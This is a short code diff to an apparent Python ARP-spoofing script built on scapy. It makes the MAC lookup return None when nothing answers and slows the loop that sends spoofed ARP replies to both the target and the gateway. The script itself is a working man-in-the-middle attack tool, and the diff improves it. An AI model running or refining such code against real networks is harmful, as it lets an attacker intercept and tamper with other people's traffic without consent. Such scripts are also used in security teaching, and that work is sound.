@@ -7,7 +7,7 @@ def get_mac(ip):
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+    return answered_list[0][1].hwsrc if answered_list else None
 
 
 def spoof(target_ip, spoof_ip):
@@ -37,7 +37,7 @@ def main():
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
             sent_packets_count = sent_packets_count + 2
-            time.sleep(1)
+            time.sleep(2)
             #print("\r[*] Packets Sent " + str(sent_packets_count), end="")
 
     except KeyboardInterrupt:
